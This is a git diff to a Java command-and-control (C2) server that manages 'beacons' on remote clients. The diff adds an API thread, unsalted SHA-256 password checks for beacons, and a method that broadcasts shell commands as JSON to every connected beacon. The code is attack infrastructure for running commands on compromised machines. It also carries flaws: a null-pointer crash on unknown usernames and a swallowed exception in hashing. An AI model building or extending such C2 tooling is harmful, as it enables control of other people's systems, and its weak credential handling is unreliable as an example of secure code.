@@ -4,10 +4,14 @@ import java.io.IOException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.TreeMap;
+
+import org.json.JSONObject;
 
 import Servers.Duplexer;
 import Servers.notifyLock;
@@ -15,6 +19,8 @@ import Servers.encryption.aes.*;
 import Servers.encryption.rsa.*;
 
 public class C2Server implements Runnable{
+    private HashMap<String, String> usernamesPasswords;
+
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
     // Formatted IP Address, Duplexer Pointer
     private HashMap<String,C2ServerBeaconHandler> longRangeBeacons;
@@ -28,6 +34,9 @@ public class C2Server implements Runnable{
 
     // Pointer to the Handler for User Input
     private C2ServerUserHandler userHandler;
+
+    // Pointer to the API Handler
+    private C2ServerAPI apiHandler;
 
     // Boolean to determine if server should remain running
     private boolean sentinel = true;
@@ -60,9 +69,11 @@ public class C2Server implements Runnable{
         this.longRangeBeacons = new HashMap<>();
         this.serverSocket = new ServerSocket(1234);
         this.userHandler = new C2ServerUserHandler(this);
+        this.apiHandler = new C2ServerAPI(this);
         this.rsa = new rsa(1024);
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
+        this.usernamesPasswords = new HashMap<>();
     }
 
     /**
@@ -78,6 +89,54 @@ public class C2Server implements Runnable{
     }
 
     /**
+     * Adds/Changes a username and hashed password in the password hashmap
+     * 
+     * @param username - Username to be updated
+     * @param hashedPassword - Hashed Password to be updated
+     */
+    protected void updateUsernamePassword(String username, String hashedPassword){
+        usernamesPasswords.put(username, hashedPassword);
+    }
+
+    /**
+     * Evaluates if a username and hashed password are valid credentials
+     * 
+     * @param username - username to be authenticated
+     * @param hashedPassword - password to be authenticated
+     * @return true or false, based on if authentication was successful or not
+     */
+    protected boolean authenticate(String username, String hashedPassword){
+        if(usernamesPasswords.get(username).equals(hashedPassword)){
+            return true;
+        }
+        return false;
+    }
+
+    /**
+     * Hashes a password with SHA-256
+     * 
+     * @param plaintext plaintext to be hashed
+     * @return SHA-256 digest of the plaintext
+     */
+    protected static String hashPassword(String plaintext){
+        String hashedPassword = "";
+        try{
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] encodedhash = digest.digest(plaintext.getBytes(StandardCharsets.UTF_8));
+            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
+            for (int i = 0; i < encodedhash.length; i++) {
+                String hex = Integer.toHexString(0xff & encodedhash[i]);
+                if(hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+            hashedPassword = hexString.toString();
+        } catch(Exception e){}
+        return hashedPassword;
+    }
+
+    /**
      * Used by the Beacon Handler to send a message to the User Handler
      * 
      * @param message Message to be displayed in the User CLI
@@ -88,6 +147,9 @@ public class C2Server implements Runnable{
         }
     }
 
+    /**
+     * Stops the server
+     */
     protected void stopServer(){
         sentinel = false; 
         try{
@@ -95,6 +157,20 @@ public class C2Server implements Runnable{
         } catch (IOException e){
             e.printStackTrace();
         }
+    }
+
+    /**
+     * Takes in the necessary parameters to run a command on all clients, formats it into a JSON object, and sends it to all of the beacons
+     * 
+     * @param scope - scope of the command
+     * @param command - command
+     */
+    protected void distributeCommandToBeacons(String scope, String command){
+        JSONObject commandJSON = new JSONObject();
+        commandJSON.put("verb", "command");
+        commandJSON.put("scope", scope);
+        commandJSON.put("command", command);
+        broadcastToBeacons(commandJSON.toString());
     }
 
     /**
@@ -133,7 +209,13 @@ public class C2Server implements Runnable{
         return shellID;
     }
 
-    protected void getShellResponse(String command){
+    /**
+     * Takes in the scope and command, executes the command on the system. Then, waits for the response to the command to be returned, and outputs the resopnse immeditely
+     * 
+     * @param scope - scope of the command
+     * @param command - command 
+     */
+    protected void getShellResponse(String scope, String command){
         // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
         shellID++;
         notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
@@ -143,8 +225,8 @@ public class C2Server implements Runnable{
         // Distribute the commands
         for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
             beaconHandler.setIsShell(true);
-            beaconHandler.sendToBeacon(command);
         }
+        distributeCommandToBeacons(scope, command);
 
         // Wait for a response, once notified, notify the user handler that it can now continue
         try{
@@ -264,6 +346,35 @@ public class C2Server implements Runnable{
         return matches;
     }
 
+    protected String formatClientStatus(HashMap<String, Boolean> clientStatus){
+        // Creating fire visually pleasing table of client status
+        String table = " ________________________________________________\n";
+        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
+        table += "|______________________|_________________________|\n";
+        Map<String, Boolean> sortedByKey = new TreeMap<>(clientStatus);
+        for (String ip : sortedByKey.keySet()) {
+            String status;
+            boolean status_bool;
+            if (clientStatus.get(ip)) {
+                status = GREEN + "CONNECTED :D" + RESET;
+                status_bool = false;
+            } else {
+                status = RED + "DISCONNECTED D:" + RESET;
+                status_bool = true;
+            }
+            // If the status is disconnected
+            if (status_bool){
+                table += String.format("| %-20s | %-33s |\n", ip, status);
+            }
+            // If the status is connected
+            else {
+                table += String.format("| %-20s | %-33s |\n", ip, status);
+            }
+        }
+        table += "|______________________|_________________________|\n";
+        return table;
+    }
+
     /**
      * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
      * 
@@ -271,7 +382,7 @@ public class C2Server implements Runnable{
      * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
      * communicate with the Beacon, False if the client cannot communicate with the Beacon
      */
-    protected String getClientStatus(){
+    protected HashMap<String, Boolean> getClientStatus(){
         // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
         // True if the client is still active, false if the client is no longer active.
         HashMap<String, Boolean> clientStatus = new HashMap<>();
@@ -305,33 +416,7 @@ public class C2Server implements Runnable{
             }   
         }
         
-
-        // Creating fire visually pleasing table of client status
-        String table = " ________________________________________________\n";
-        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
-        table += "|______________________|_________________________|\n";
-        Map<String, Boolean> sortedByKey = new TreeMap<>(clientStatus);
-        for (String ip : sortedByKey.keySet()) {
-            String status;
-            boolean status_bool;
-            if (clientStatus.get(ip)) {
-                status = GREEN + "CONNECTED :D" + RESET;
-                status_bool = false;
-            } else {
-                status = RED + "DISCONNECTED D:" + RESET;
-                status_bool = true;
-            }
-            // If the status is disconnected
-            if (status_bool){
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-            // If the status is connected
-            else {
-                table += String.format("| %-20s | %-33s |\n", ip, status);
-            }
-        }
-        table += "|______________________|_________________________|\n";
-        return table;
+        return clientStatus;
     }
     
     @Override
@@ -340,6 +425,10 @@ public class C2Server implements Runnable{
         Thread userHandlerThread = new Thread(userHandler);
         userHandlerThread.start();
         
+        // Start API
+        Thread apiHandlerThread = new Thread(apiHandler);
+        apiHandlerThread.start();
+
         // Always listen for new long range beacons
         while(sentinel){
             try{
@@ -371,9 +460,15 @@ public class C2Server implements Runnable{
                 
                 // Receive initial message for authentication from the new Beacon
                 String hashedPassForAuth = aes.decrypt(duplexer.receive(true));
-
+                String authResponse;
                 // Pass this hash to the User Handler thread for MFA
-                String authResponse = userHandler.authenticateToC2(hashedPassForAuth, IPAddress);
+                if(authenticate("root", hashedPassForAuth)){
+                    authResponse = userHandler.authenticateToC2(IPAddress);
+                } else {
+                    authResponse = "Authentication Failed: Incorrect Password";
+                }
+                
+
                 duplexer.send(aes.encrypt(authResponse), true);
                 if(!(authResponse.equals("Authentication Successful"))){
                     duplexer.close();
